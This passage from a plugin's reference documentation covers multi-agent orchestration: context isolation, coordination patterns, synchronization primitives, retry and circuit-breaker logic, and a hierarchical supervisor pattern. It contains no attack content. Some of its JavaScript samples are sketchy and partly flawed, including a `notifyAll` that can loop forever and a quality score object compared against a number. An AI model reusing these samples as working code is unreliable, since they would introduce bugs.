}\n\n    // Check data types\n    for (const [field, expectedType] of Object.entries(requirements.dataTypes)) {\n      if (context.hasOwnProperty(field)) {\n        const actualType = typeof context[field]\n        if (actualType !== expectedType) {\n          errors.push(`Field ${field} has wrong type: ${actualType} != ${expectedType}`)\n        }\n      }\n    }\n\n    // Check relevance\n    const relevance = this.calculateRelevance(context)\n    if (relevance < requirements.minRelevance) {\n      warnings.push(`Low relevance: ${relevance}. Consider filtering.`)\n    }\n\n    return { valid: errors.length === 0, errors, warnings }\n  }\n}\n```\n\n### Tool 3: Context Optimizer\n\n```javascript\nclass ContextOptimizer {\n  optimize(context, requirements) {\n    let optimized = { ...context }\n\n    // Reduce size if needed\n    if (this.countTokens(optimized) > requirements.maxTokens) {\n      optimized = this.reduceSize(optimized, requirements.maxTokens)\n    }\n\n    // Filter irrelevant data\n    if (requirements.relevanceFilter) {\n      optimized = this.filterRelevance(optimized, requirements.relevanceFilter)\n    }\n\n    // Summarize if needed\n    if (requirements.summarize) {\n      optimized = this.summarize(optimized)\n    }\n\n    return optimized\n  }\n\n  reduceSize(context, maxTokens) {\n    let current = context\n    let tokenCount = this.countTokens(current)\n\n    while (tokenCount > maxTokens) {\n      // Strategies: remove least important data, summarize text, etc.\n      current = this.removeLeastImportant(current)\n      tokenCount = this.countTokens(current)\n    }\n\n    return current\n  }\n\n  filterRelevance(context, filter) {\n    return {\n      ...context,\n      data: context.data.filter(item => this.isRelevant(item, filter))\n    }\n  }\n\n  isRelevant(item, filter) {\n    return filter.criteria.some(criterion =>\n      this.matches(item, criterion)\n    )\n  }\n}\n```\n\n## Monitoring Context Isolation\n\n### Metrics\n\n```javascript\nclass ContextMetrics {\n  track(contextId, context, agentType) {\n    return {\n      contextId: contextId,\n      agentType: agentType,\n      size: this.countTokens(context),\n      isolationScore: this.calculateIsolationScore(context),\n      relevanceScore: this.calculateRelevance(context),\n      efficiency: this.calculateEfficiency(context)\n    }\n  }\n\n  calculateIsolationScore(context) {\n    // Measure how well context is isolated\n    const optimalSize = 5000 // tokens\n    const actualSize = this.countTokens(context)\n    const sizeScore = 1 - Math.abs(actualSize - optimalSize) / optimalSize\n\n    const relevance = this.calculateRelevance(context)\n\n    return (sizeScore + relevance) / 2\n  }\n\n  aggregate(metrics) {\n    return {\n      averageSize: this.average(metrics.map(m => m.size)),\n      averageIsolation: this.average(metrics.map(m => m.isolationScore)),\n      averageRelevance: this.average(metrics.map(m => m.relevanceScore)),\n      totalEfficiency: this.average(metrics.map(m => m.efficiency))\n    }\n  }\n}\n```\n\n## Best Practices Summary\n\n### Do's GOOD\n\nGOOD **Keep contexts minimal**\n- Only include necessary information\n- Filter irrelevant data\n- Use focused contexts\n\nGOOD **Use file-based coordination**\n- Write to files, not memory\n- Agents read/write files\n- Clear separation\n\nGOOD **Return results, not context**\n- Artifacts, not ongoing state\n- Structured outputs\n- Metadata only\n\nGOOD **Validate contexts**\n- Check size limits\n- Verify relevance\n- Ensure isolation\n\nGOOD **Monitor context usage**\n- Track token counts\n- Measure isolation\n- Optimize regularly\n\n### Don'ts BAD\n\nBAD **Don't share full context**\n- Never pass conversation history\n- Don't include irrelevant data\n- Maintain isolation\n\nBAD **Don't accumulate state**\n- Use stateless agents\n- Don't modify shared context\n- Immutable data structures\n\nBAD **Don't leak context**\n- Agents should only access their data\n- No cross-agent context access\n- Clear boundaries\n\nBAD **Don't exceed limits**\n- Monitor token counts\n- Trim when necessary\n- Respect agent limits\n\nBAD **Don't over-engineer**\n- Start with simple isolation\n- Add complexity as needed\n- Measure before optimizing\n\n## Conclusion\n\nContext isolation is **fundamental** to multi-agent systems:\n\n1. **Prevents saturation** - Context windows don't overflow\n2. **Improves quality** - Agents focus on their tasks\n3. **Enables scale** - Handle larger, complex tasks\n4. **Increases efficiency** - Less data to process\n\nRemember:\n- Minimal is better\n- Files over memory\n- Results over state\n- Monitor and optimize\n\nThe goal: Each agent has exactly what it needs, nothing more.\n",
        "plugins/sys-agents/skills/orchestrating-agents/references/coordination.md": "# Agent Coordination\n\n## What is Agent Coordination?\n\nAgent coordination is the **communication and synchronization** between multiple agents working on a shared task. It ensures agents work together effectively, share information appropriately, and produce coherent results.\n\n## Types of Coordination\n\n### 1. Direct Coordination\n\nAgents communicate **directly** with each other.\n\n```javascript\n// Agent A requests data from Agent B\nconst result = await agentB.execute({\n  type: 'data_request',\n  query: 'customer_churn_data'\n})\n\n// Agent A uses result\nreturn this.process(result.data)\n```\n\n**Pros:**\n- Simple to implement\n- Low latency\n- Direct communication\n\n**Cons:**\n- Tight coupling\n- Hard to scale\n- Complex dependency management\n\n### 2. Mediated Coordination\n\nAgents communicate through a **coordinator**.\n\n```javascript\n// Agent A requests data via coordinator\ncoordinator.request({\n  from: agentA,\n  to: agentB,\n  type: 'data_request',\n  query: 'customer_churn_data'\n})\n\n// Coordinator routes to Agent B\nconst result = agentB.execute(request)\n\n// Coordinator routes back to Agent A\nreturn coordinator.respond(result)\n```\n\n**Pros:**\n- Loose coupling\n- Better monitoring\n- Easier to scale\n\n**Cons:**\n- Additional overhead\n- Coordinator becomes bottleneck\n- More complex\n\n### 3. Shared Memory Coordination\n\nAgents communicate through **shared data structures**.\n\n```javascript\n// Agent A writes to shared memory\nsharedMemory.set('data_for_agent_b', data)\n\n// Agent B reads from shared memory\nconst data = sharedMemory.get('data_for_agent_b')\n\n// Agent B writes result\nsharedMemory.set('result_for_agent_a', result)\n\n// Agent A reads result\nconst result = sharedMemory.get('result_for_agent_a')\n```\n\n**Pros:**\n- Decoupled timing\n- Easy to add agents\n- Shared state\n\n**Cons:**\n- Synchronization issues\n- Potential conflicts\n- Memory management\n\n### 4. File-Based Coordination\n\nAgents communicate through **files**.\n\n```javascript\n// Agent A writes task file\nawait fs.writeFile('task_for_b.json', JSON.stringify(task))\n\n// Agent B reads task file\nconst task = JSON.parse(await fs.readFile('task_for_b.json'))\n\n// Agent B writes result file\nawait fs.writeFile('result_for_a.json', JSON.stringify(result))\n\n// Agent A reads result file\nconst result = JSON.parse(await fs.readFile('result_for_a.json'))\n```\n\n**Pros:**\n- Decoupled execution\n- Persistent\n- Easy debugging\n- Language agnostic\n\n**Cons:**\n- I/O overhead\n- File system dependency\n- Cleanup needed\n\n## Coordination Patterns\n\n### Pattern 1: Request-Response\n\n```javascript\nclass RequestResponseCoordinator {\n  async request(fromAgent, toAgent, request) {\n    const requestId = this.generateId()\n\n    // Store pending request\n    this.pending[requestId] = {\n      from: fromAgent,\n      request: request,\n      timestamp: Date.now()\n    }\n\n    // Send to target agent\n    const response = await toAgent.execute(request)\n\n    // Return to requesting agent\n    return response\n  }\n}\n```\n\n### Pattern 2: Publish-Subscribe\n\n```javascript\nclass PubSubCoordinator {\n  constructor() {\n    this.subscribers = new Map()\n    this.topics = new Map()\n  }\n\n  subscribe(agent, topic) {\n    if (!this.subscribers.has(topic)) {\n      this.subscribers.set(topic, new Set())\n    }\n    this.subscribers.get(topic).add(agent)\n  }\n\n  publish(topic, message) {\n    const agents = this.subscribers.get(topic) || new Set()\n\n    for (const agent of agents) {\n      agent.notify(topic, message)\n    }\n  }\n}\n```\n\n### Pattern 3: Blackboard\n\n```javascript\nclass BlackboardCoordinator {\n  constructor() {\n    this.blackboard = new SharedMemory()\n    this.agents = new Set()\n  }\n\n  register(agent) {\n    this.agents.add(agent)\n    agent.setBlackboard(this.blackboard)\n  }\n\n  // Agents write to blackboard\n  write(agentId, key, value) {\n    this.blackboard.set(key, {\n      value: value,\n      writer: agentId,\n      timestamp: Date.now()\n    })\n  }\n\n  // Agents read from blackboard\n  read(key) {\n    return this.blackboard.get(key)\n  }\n\n  // Notify other agents of changes\n  notify(agentId, key, value) {\n    for (const agent of this.agents) {\n      if (agent.id !== agentId) {\n        agent.onBlackboardChange(key, value)\n      }\n    }\n  }\n}\n```\n\n### Pattern 4: Token Passing\n\n```javascript\nclass TokenPassingCoordinator {\n  constructor() {\n    this.token = {\n      holder: null,\n      data: null,\n      queue: []\n    }\n  }\n\n  async request(agentId, data) {\n    if (this.token.holder === null) {\n      // Grant token immediately\n      this.token.holder = agentId\n      this.token.data = data\n      return data\n    } else {\n      // Add to queue\n      this.token.queue.push({ agentId, data })\n      return this.waitForToken(agentId)\n    }\n  }\n\n  async passToken(agentId, result) {\n    if (this.token.holder === agentId) {\n      this.token.holder = null\n\n      if (this.token.queue.length > 0) {\n        const next = this.token.queue.shift()\n        this.token.holder = next.agentId\n        this.token.data = next.data\n\n        // Notify next agent\n        this.notifyAgent(next.agentId)\n      }\n    }\n  }\n}\n```\n\n## Synchronization Mechanisms\n\n### 1. Locks and Mutexes\n\n```javascript\nclass Mutex {\n  constructor() {\n    this.locked = false\n    this.queue = []\n  }\n\n  async acquire() {\n    if (!this.locked) {\n      this.locked = true\n      return\n    }\n\n    return new Promise(resolve => {\n      this.queue.push(resolve)\n    })\n  }\n\n  release() {\n    if (this.queue.length > 0) {\n      const resolve = this.queue.shift()\n      this.locked = true\n      resolve()\n    } else {\n      this.locked = false\n    }\n  }\n\n  async withLock(fn) {\n    await this.acquire()\n    try {\n      return await fn()\n    } finally {\n      this.release()\n    }\n  }\n}\n```\n\n### 2. Barriers\n\n```javascript\nclass Barrier {\n  constructor(count) {\n    this.count = count\n    this.reached = 0\n    this.waiters = []\n  }\n\n  async wait() {\n    this.reached++\n\n    if (this.reached < this.count) {\n      // Wait for others\n      return new Promise(resolve => {\n        this.waiters.push(resolve)\n      })\n    } else {\n      // All reached, release all\n      this.reached = 0\n      const waiters = [...this.waiters]\n      this.waiters = []\n\n      for (const resolve of waiters) {\n        resolve()\n      }\n    }\n  }\n}\n```\n\n### 3. Condition Variables\n\n```javascript\nclass Condition {\n  constructor() {\n    this.waiters = []\n    this.predicate = () => false\n  }\n\n  setPredicate(predicate) {\n    this.predicate = predicate\n    this.check()\n  }\n\n  async wait() {\n    if (this.predicate()) {\n      return\n    }\n\n    return new Promise(resolve => {\n      this.waiters.push(resolve)\n    })\n  }\n\n  notify() {\n    this.check()\n  }\n\n  notifyAll() {\n    while (this.waiters.length > 0) {\n      this.check()\n    }\n  }\n\n  check() {\n    if (this.predicate() && this.waiters.length > 0) {\n      const resolve = this.waiters.shift()\n      resolve()\n    }\n  }\n}\n```\n\n## Conflict Resolution\n\n### Strategy 1: Priority-Based\n\n```javascript\nclass PriorityCoordinator {\n  async resolve(requests) {\n    // Sort by priority\n    requests.sort((a, b) => b.priority - a.priority)\n\n    // Grant to highest priority\n    return requests[0]\n  }\n}\n```\n\n### Strategy 2: First-Come-First-Served\n\n```javascript\nclass FCFSCoordinator {\n  constructor() {\n    this.queue = []\n  }\n\n  async enqueue(request) {\n    this.queue.push({\n      request: request,\n      timestamp: Date.now()\n    })\n  }\n\n  async dequeue() {\n    if (this.queue.length === 0) {\n      return null\n    }\n\n    return this.queue.shift().request\n  }\n}\n```\n\n### Strategy 3: Voting\n\n```javascript\nclass VotingCoordinator {\n  async vote(requests) {\n    const voteCounts = new Map()\n\n    // Count votes\n    for (const request of requests) {\n      const key = this.getRequestKey(request)\n      voteCounts.set(key, (voteCounts.get(key) || 0) + 1)\n    }\n\n    // Find majority\n    const sorted = [...voteCounts.entries()]\n      .sort((a, b) => b[1] - a[1])\n\n    return sorted[0][0]\n  }\n\n  getRequestKey(request) {\n    // Create canonical representation\n    return JSON.stringify({\n      type: request.type,\n      data: request.data\n    })\n  }\n}\n```\n\n### Strategy 4: Arbitration\n\n```javascript\nclass ArbitrationCoordinator {\n  constructor(arbitrator) {\n    this.arbitrator = arbitrator\n  }\n\n  async resolve(requests) {\n    return this.arbitrator.decide(requests)\n  }\n}\n\n// Example arbitrator\nclass CustomArbitrator {\n  decide(requests) {\n    // Custom logic\n    if (requests.some(r => r.type === 'emergency')) {\n      return requests.find(r => r.type === 'emergency')\n    }\n\n    return requests[0] // Default to first\n  }\n}\n```\n\n## Error Handling\n\n### Retry Logic\n\n```javascript\nclass RetryCoordinator {\n  async executeWithRetry(agent, task, maxRetries = 3) {\n    for (let attempt = 1; attempt <= maxRetries; attempt++) {\n      try {\n        return await agent.execute(task)\n      } catch (error) {\n        if (attempt === maxRetries) {\n          throw error\n        }\n\n        // Exponential backoff\n        await this.delay(Math.pow(2, attempt) * 1000)\n\n        // Retry with same or modified task\n        task = this.adjustTask(task, error, attempt)\n      }\n    }\n  }\n\n  delay(ms) {\n    return new Promise(resolve => setTimeout(resolve, ms))\n  }\n\n  adjustTask(task, error, attempt) {\n    // Simplify task on retry\n    return {\n      ...task,\n      constraints: {\n        ...task.constraints,\n        maxRetries: 0 // Prevent infinite recursion\n      }\n    }\n  }\n}\n```\n\n### Circuit Breaker\n\n```javascript\nclass CircuitBreaker {\n  constructor(threshold = 5, timeout = 60000) {\n    this.threshold = threshold\n    this.timeout = timeout\n    this.failureCount = 0\n    this.lastFailureTime = null\n    this.state = 'CLOSED' // CLOSED, OPEN, HALF_OPEN\n  }\n\n  async execute(operation) {\n    if (this.state === 'OPEN') {\n      if (this.shouldAttemptReset()) {\n        this.state = 'HALF_OPEN'\n      } else {\n        throw new Error('Circuit breaker is OPEN')\n      }\n    }\n\n    try {\n      const result = await operation()\n      this.onSuccess()\n      return result\n    } catch (error) {\n      this.onFailure()\n      throw error\n    }\n  }\n\n  onSuccess() {\n    this.failureCount = 0\n    this.state = 'CLOSED'\n  }\n\n  onFailure() {\n    this.failureCount++\n    this.lastFailureTime = Date.now()\n\n    if (this.failureCount >= this.threshold) {\n      this.state = 'OPEN'\n    }\n  }\n\n  shouldAttemptReset() {\n    return Date.now() - this.lastFailureTime > this.timeout\n  }\n}\n```\n\n## Deadlock Prevention\n\n### Strategy 1: Resource Ordering\n\n```javascript\n// Always acquire locks in the same order\nclass OrderedLock {\n  constructor(resourceId) {\n    this.resourceId = resourceId\n  }\n\n  async acquire(locks) {\n    // Sort locks by resource ID\n    const sorted = locks.sort((a, b) => a.resourceId.localeCompare(b.resourceId))\n\n    for (const lock of sorted) {\n      await lock.acquire()\n    }\n  }\n}\n```\n\n### Strategy 2: Timeout\n\n```javascript\nclass TimeoutCoordinator {\n  async requestWithTimeout(request, timeout = 5000) {\n    const result = await Promise.race([\n      this.executeRequest(request),\n      this.timeout(timeout)\n    ])\n\n    return result\n  }\n\n  timeout(ms) {\n    return new Promise((_, reject) => {\n      setTimeout(() => reject(new Error('Timeout')), ms)\n    })\n  }\n}\n```\n\n### Strategy 3: Deadlock Detection\n\n```javascript\nclass DeadlockDetector {\n  constructor() {\n    this.waitForGraph = new Map()\n  }\n\n  detectDeadlock() {\n    const graph = this.buildWaitForGraph()\n\n    // Check for cycles\n    return this.hasCycle(graph)\n  }\n\n  buildWaitForGraph() {\n    const graph = new Map()\n\n    for (const [agent, waitingFor] of this.waitForGraph.entries()) {\n      if (!graph.has(agent)) {\n        graph.set(agent, new Set())\n      }\n\n      graph.get(agent).add(waitingFor)\n    }\n\n    return graph\n  }\n\n  hasCycle(graph) {\n    const visited = new Set()\n    const recursionStack = new Set()\n\n    for (const node of graph.keys()) {\n      if (this.hasCycleDFS(node, graph, visited, recursionStack)) {\n        return true\n      }\n    }\n\n    return false\n  }\n\n  hasCycleDFS(node, graph, visited, recursionStack) {\n    visited.add(node)\n    recursionStack.add(node)\n\n    for (const neighbor of graph.get(node) || []) {\n      if (!visited.has(neighbor)) {\n        if (this.hasCycleDFS(neighbor, graph, visited, recursionStack)) {\n          return true\n        }\n      } else if (recursionStack.has(neighbor)) {\n        return true\n      }\n    }\n\n    recursionStack.delete(node)\n    return false\n  }\n}\n```\n\n## Load Balancing\n\n### Round Robin\n\n```javascript\nclass RoundRobinBalancer {\n  constructor(agents) {\n    this.agents = agents\n    this.index = 0\n  }\n\n  getNextAgent() {\n    const agent = this.agents[this.index]\n    this.index = (this.index + 1) % this.agents.length\n    return agent\n  }\n}\n```\n\n### Least Loaded\n\n```javascript\nclass LeastLoadedBalancer {\n  constructor(agents) {\n    this.agents = agents.map(agent => ({\n      agent: agent,\n      load: 0\n    }))\n  }\n\n  getNextAgent() {\n    // Return agent with lowest load\n    const sorted = this.agents.sort((a, b) => a.load - b.load)\n    return sorted[0].agent\n  }\n\n  updateLoad(agentId, delta) {\n    const entry = this.agents.find(a => a.agent.id === agentId)\n    if (entry) {\n      entry.load += delta\n    }\n  }\n}\n```\n\n## Monitoring and Metrics\n\n### Key Metrics\n\n```javascript\nclass CoordinationMetrics {\n  track(request) {\n    return {\n      requestId: request.id,\n      agentId: request.agentId,\n      startTime: Date.now(),\n      coordinationTime: null,\n      result: null,\n      errors: []\n    }\n  }\n\n  recordSuccess(metrics, result) {\n    metrics.coordinationTime = Date.now() - metrics.startTime\n    metrics.result = 'success'\n    return metrics\n  }\n\n  recordError(metrics, error) {\n    metrics.errors.push(error)\n    metrics.result = 'error'\n    return metrics\n  }\n\n  aggregate(allMetrics) {\n    return {\n      totalRequests: allMetrics.length,\n      successRate: this.calculateSuccessRate(allMetrics),\n      averageLatency: this.calculateAverageLatency(allMetrics),\n      errorRate: this.calculateErrorRate(allMetrics),\n      throughput: this.calculateThroughput(allMetrics)\n    }\n  }\n}\n```\n\n## Best Practices\n\n### Do's GOOD\n\nGOOD **Define clear interfaces**\n- Specify message formats\n- Document protocols\n- Version interfaces\n\nGOOD **Use structured communication**\n- JSON, XML, Protocol Buffers\n- Consistent schemas\n- Type safety\n\nGOOD **Handle errors gracefully**\n- Implement retries\n- Use circuit breakers\n- Log failures\n\nGOOD **Monitor coordination**\n- Track metrics\n- Detect bottlenecks\n- Alert on issues\n\nGOOD **Design for failure**\n- Assume agents will fail\n- Implement timeouts\n- Have fallback plans\n\n### Don'ts BAD\n\nBAD **Don't tight couple agents**\n- Use mediators\n- Avoid direct dependencies\n- Keep interfaces abstract\n\nBAD **Don't block on slow agents**\n- Use async/await\n- Implement timeouts\n- Consider cancellation\n\nBAD **Don't ignore scalability**\n- Plan for many agents\n- Avoid single coordinator bottlenecks\n- Use load balancing\n\nBAD **Don't skip testing**\n- Test coordination logic\n- Simulate failures\n- Test under load\n\nBAD **Don't hardcode delays**\n- Use adaptive timeouts\n- Monitor performance\n- Adjust based on metrics\n\n## Conclusion\n\nEffective coordination is **critical** for multi-agent systems:\n\n1. **Choose the right pattern** - Match coordination to use case\n2. **Handle failures** - Implement retries, timeouts, circuit breakers\n3. **Prevent deadlocks** - Use ordering, timeouts, detection\n4. **Balance load** - Distribute work evenly\n5. **Monitor continuously** - Track metrics, detect issues\n\nRemember:\n- Simple coordination first\n- Add complexity incrementally\n- Test thoroughly\n- Monitor in production\n\nThe goal: Agents work together seamlessly to solve complex tasks.\n",
        "plugins/sys-agents/skills/orchestrating-agents/references/hierarchical-pattern.md": "# Hierarchical Pattern\n\n## Overview\n\nThe **Hierarchical Pattern** uses manager agents to supervise worker agents, creating a tree of supervision with progressive context isolation at each level.\n\n## Pattern Definition\n\n```\nTop Manager\n   Supervisors (Level 1)\n     Workers (Level 2)\n       Specialists (Level 3)\n         Execute\n   Synthesis at each level\n   Quality gates\n```\n\nEach level adds supervision, quality control, and progressive refinement.\n\n## When to Use\n\n**Ideal for:**\n- Large, complex tasks with hierarchy\n- Need for quality control at each level\n- Multi-level task decomposition\n- Quality gates required\n- Compliance and review processes\n- Progressive refinement\n\n**Not suitable for:**\n- Simple, small tasks\n- When latency is critical\n- Limited resources for supervision\n- Flat, independent tasks\n\n## Architecture\n\n### Components\n\n**1. Top-Level Manager**\n- Receives overall task\n- Decomposes into major components\n- Assigns to level-1 supervisors\n- Synthesizes final result\n\n**2. Supervisors (Each Level)**\n- Manage subset of task\n- Supervise workers at next level\n- Perform quality checks\n- Synthesize results\n- Report to manager\n\n**3. Workers**\n- Execute specific tasks\n- Produce structured outputs\n- Report to supervisors\n- Implement quality gates\n\n**4. Synthesis Points**\n- Combine results at each level\n- Quality assessment\n- Conflict resolution\n- Progress reporting\n\n## Implementation\n\n### Basic Hierarchical Structure\n\n```javascript\nclass HierarchicalAgent {\n  constructor(depth = 3, width = 3) {\n    this.depth = depth\n    this.width = width\n  }\n\n  async execute(task) {\n    if (this.depth === 0) {\n      return this.executeDirectly(task)\n    }\n\n    // Decompose task\n    const subtasks = this.decompose(task)\n\n    // Execute subtasks with supervision\n    const results = await Promise.all(\n      subtasks.map(subtask => this.supervise(subtask, this.depth - 1))\n    )\n\n    // Synthesize at this level\n    return this.synthesize(results)\n  }\n\n  async supervise(task, level) {\n    const supervisor = new HierarchicalAgent(level, this.width)\n    return supervisor.execute(task)\n  }\n\n  decompose(task) {\n    // Break task into subtasks\n    return Array(this.width).fill(0).map((_, i) => ({\n      id: i,\n      ...task,\n      level: this.depth\n    }))\n  }\n\n  synthesize(results) {\n    // Combine results\n    return results.reduce((acc, result) => ({ ...acc, ...result }), {})\n  }\n}\n```\n\n### Quality Gates Implementation\n\n```javascript\nclass HierarchicalAgentWithQuality extends HierarchicalAgent {\n  async supervise(task, level) {\n    // Execute task\n    const result = await this.executeTask(task)\n\n    // Quality check\n    const quality = this.assessQuality(result)\n\n    if (quality < this.qualityThreshold) {\n      // Retry or escalate\n      if (level > 0) {\n        // Try with more supervision\n        return this.retryWithMoreSupervision(task, level)\n      } else {\n        // Final attempt - may be suboptimal\n        return this.handleLowQuality(result)\n      }\n    }\n\n    return result\n  }\n\n  assessQuality(result) {\n    // Implement quality metrics\n    return {\n      completeness: this.checkCompleteness(result),\n      accuracy: this.checkAccuracy(result),\n      consistency: this.checkConsistency(result)\n    }\n  }\n}\n```\n\n### Progressive Refinement\n\n```javascript\nclass ProgressiveHierarchicalAgent extends HierarchicalAgent {\n  async execute(task) {\n    // Level 1: Coarse decomposition\n    const coarseResults = await this.level1(task)\n\n    // Level 2: Refine each coarse result\n    const refinedResults = await Promise.all(\n      coarseResults.map(result => this.level2(result))\n    )\n\n    // Level 3: Further refinement\n    const finalResults = await Promise.all(\n      refinedResults.map(result => this.level3(result))\n    )\n\n    // Synthesis\n    return this.synthesize(finalResults)\n  }\n\n  async level1(task) {\n    const managers = Array(2).fill(0).map(() => new ManagerAgent())\n    return Promise.all(\n      managers.map(manager => manager.execute(task))\n    )\n  }\n\n  async level2(coarseResult) {\n    const supervisors = Array(3).fill(0).map(() => new SupervisorAgent())\n    return Promise.all(\n      supervisors.map(supervisor => supervisor.execute(coarseResult))\n    )\n  }\n\n  async level3(refinedResult) {\n    const workers = Array(5).fill(0).map(() => new WorkerAgent())\n    return Promise.all(\n      workers.map(worker => worker.execute(refinedResult))\n    )\n  }\n}\n```\n\n## Example Use Cases\n\n### Use Case 1: Software Development\n\n**Task:** \"Build enterprise application\"\n\n**Hierarchy:**\n- **Top Manager:** Product requirements  Project plan\n- **Level 1 Supervisors (3):** Frontend, Backend, Infrastructure\n- **Level 2 Workers:** UI components, API endpoints, databases, CI/CD\n- **Level 3 Specialists:** Unit tests, integration tests, security audits\n\n**Execution:**\n```\nEnterprise App Task\n   Manager: \"Architect application\"\n     Supervisor 1: \"Build frontend\"\n       Worker: \"Create UI components\"\n       Worker: \"Implement routing\"\n       Worker: \"State management\"\n     Supervisor 2: \"Build backend\"\n       Worker: \"API endpoints\"\n       Worker: \"Database schema\"\n       Worker: \"Authentication\"\n     Supervisor 3: \"Infrastructure\"\n       Worker: \"CI/CD pipeline\"\n       Worker: \"Monitoring\"\n       Worker: \"Security audits\"\n   Synthesis: Integrated application\n```\n\n### Use Case 2: Medical Diagnosis\n\n**Task:** \"Diagnose patient condition\"\n\n**Hierarchy:**\n- **Top Manager:** Chief physician reviews case\n- **Level 1 Supervisors:** Specialists (cardiology, neurology, etc.)\n- **Level 2 Workers:** Tests, scans, lab work\n- **Level 3 Specialists:** Detailed analysis, second opinions\n\n### Use Case 3: Legal Review\n\n**Task:** \"Review contract for risks\"\n\n**Hierarchy:**\n- **Top Manager:** Senior partner\n- **Level 1 Supervisors:** Practice area leads\n- **Level 2 Workers:** Associates review sections\n- **Level 3 Specialists:** Subject matter experts\n\n## Benefits\n\n**Quality Control at Each Level**\n- Review at every level\n- Catch errors early\n- Progressive refinement\n- High confidence in output\n\n**Scalable Hierarchy**\n- Add levels for complexity\n- Add width for parallel work\n- Handle large tasks\n- Modular structure\n\n**Progressive Context Isolation**\n- Each level isolates context\n- Prevents saturation\n- Focused supervision\n- Manageable complexity\n\n**Error Detection and Correction**\n- Catch errors at multiple levels\n- Self-correcting at lower levels\n- Escalation mechanisms\n- Robust error handling\n\n**Compliance and Review**\n- Built-in review process\n- Audit trail at each level\n- Quality gates\n- Risk mitigation\n\n## Limitations\n\n**More Complex Coordination**\n- Multiple levels to coordinate\n- Complex communication patterns\n- Synthesis overhead\n- Coordination bottlenecks\n\n**Potential Latency**\n- Sequential quality checks\n- Multiple review stages\n- Time for synthesis\n- May be slower than simpler patterns\n\n**Manager Agent Overhead**\n- Each level adds overhead\n- Supervision costs resources\n- Quality gates take time\n- May be overkill for simple tasks\n\n**Complex Error Handling**\n- Errors at multiple levels\n- Complex escalation\n- Recovery strategies needed\n- Debugging is harder\n\n**Resource Intensive**\n- Multiple agents per task\n- Higher computational cost\n- More memory usage\n- Coordination overhead\n\n## Best Practices\n\n### 1. Appropriate Depth\n\n**Do:**\n- Match depth to task complexity\n- Start shallow, deepen if needed\n- Consider quality requirements\n- Balance depth vs. overhead\n\n**Example:**\n```javascript\n// Simple task: shallow hierarchy\nconst task = \"Summarize document\"\nconst hierarchy = new HierarchicalAgent(depth = 1)\n\n// Complex task: deeper hierarchy\nconst task = \"Build enterprise application\"\nconst hierarchy = new HierarchicalAgent(depth = 4)\n```\n\n### 2. Clear Quality Gates\n\n**Do:**\n- Define quality metrics per level\n- Set appropriate thresholds\n- Implement quality checks\n- Handle quality failures\n\n**Example:**\n```javascript\nclass QualityGate {\n  check(task, result, level) {\n    const metrics = {\n      0: { threshold: 0.95, focus: 'accuracy' },\n      1: { threshold: 0.90, focus: 'completeness' },\n      2: { threshold: 0.85, focus: 'consistency' }\n    }\n\n    return this.assess(result, metrics[level])\n  }\n}\n```\n\n### 3. Progressive Isolation\n\n**Do:**\n- Isolate context at each level\n- Pass only necessary information\n- Maintain clear boundaries\n- Document isolation strategy\n\n**Example:**\n```javascript\n// Level 0: Full context\nconst topManager = new Manager()\nconst result = topManager.execute(fullTask)\n\n// Level 1: Reduced context\nconst supervisor1 = new Supervisor()\nconst subtask1 = supervisor1.extractRelevantContext(result, subtaskType1)\n\n// Level 2: Minimal context\nconst worker1 = new Worker()\nconst minimalContext = worker1.getMinimalContext(subtask1)\n```\n\n### 4. Efficient Synthesis\n\n**Do:**\n- Synthesize at appropriate levels\n- Use structured combination\n- Handle conflicts early\n- Optimize synthesis points\n\n**Example:**\n```javascript\nsynthesize(results) {\n  // Strategy depends on result type\n  if (this.isNumerical(results)) {\n    return this.weightedAverage(results)\n  } else if (this.isStructured(results)) {\n    return this.mergeStructured(results)\n  } else {\n    return this.consensus(results)\n  }\n}\n```\n\n### 5. Escalation Strategy\n\n**Do:**\n- Define escalation criteria\n- Handle failures gracefully\n- Provide fallback options\n- Document escalation paths\n\n**Example:**\n```javascript\nhandleFailure(task, error, level) {\n  if (level < this.maxLevels) {\n    // Retry with more supervision\n    return this.retryWithMoreSupervision(task, level + 1)\n  } else {\n    // Final fallback\n    return this.fallbackStrategy(task, error)\n  }\n}\n```\n\n## Anti-Patterns to Avoid\n\n### Anti-Pattern 1: Too Many Levels\n\n**Problem:** Unnecessarily deep hierarchy\n```javascript\n// Bad: Over-engineering\nconst task = \"Write email\"\nconst hierarchy = new HierarchicalAgent(depth = 5)\n```\n\n**Solution:** Match depth to complexity\n```javascript\n// Good: Appropriate depth\nconst task = \"Build spacecraft\"\nconst hierarchy = new HierarchicalAgent(depth = 4)\n```\n\n### Anti-Pattern 2: No Quality Gates\n\n**Problem:** Hierarchy without quality checks\n```javascript\n// Bad: Pass-through hierarchy\nasync supervise(task, level) {\n  const result = await this.execute(task, level - 1)\n  return result // No quality check!\n}\n```\n\n**Solution:** Add quality gates\n```javascript\n// Good: Quality gate\nasync supervise(task, level) {\n  const result = await this.execute(task, level - 1)\n  return this.qualityGate.check(result, level)\n}\n```\n\n### Anti-Pattern 3: Context Leakage\n\n**Problem:** Context not isolated between levels\n```javascript\n// Bad: Full context leaked\nconst worker = new Worker()\nworker.execute(task, fullContext)\n```\n\n**Solution:** Progressive isolation\n```javascript\n// Good: Isolated context\nconst worker = new Worker()\nworker.execute(task, isolatedContext)\n```\n\n## Advanced Patterns\n\n### Dynamic Hierarchy\n\n```javascript\nclass DynamicHierarchicalAgent extends HierarchicalAgent {\n  async execute(task) {\n    const initialDepth = this.assessRequiredDepth(task)\n\n    // Start with shallow hierarchy\n    let result = await super.execute(task)\n\n    // If quality is low, add more levels\n    while (this.assessQuality(result) < this.threshold) {\n      result = await this.addLevel(result)\n    }\n\n    return result\n  }\n\n  assessRequiredDepth(task) {\n    // Heuristic: larger tasks need deeper hierarchies\n    return Math.ceil(task.size / 1000)\n  }\n}\n```\n\n### Adaptive Width\n\n```javascript\nclass AdaptiveHierarchicalAgent extends HierarchicalAgent {\n  constructor() {\n    super()\n    this.minWidth = 2\n    this.maxWidth = 10\n  }\n\n  decompose(task) {\n    const width = this.calculateOptimalWidth(task)\n    return Array(width).fill(0).map((_, i) => ({\n      id: i,\n      ...task\n    }))\n  }\n\n  calculateOptimalWidth(task) {\n    // Adjust width based on task characteristics\n    const cpuAvailable = this.getAvailableCPU()\n    const parallelism = task.parallelism || 1\n\n    return Math.min(this.maxWidth, Math.max(this.minWidth, parallelism))\n  }\n}\n```\n\n## Monitoring and Metrics\n\n### Key Metrics\n\n**Performance:**\n- **Average depth used**\n- **Quality gate pass rate**\n- **Synthesis efficiency**\n- **Coordination overhead**\n\n**Quality:**\n- 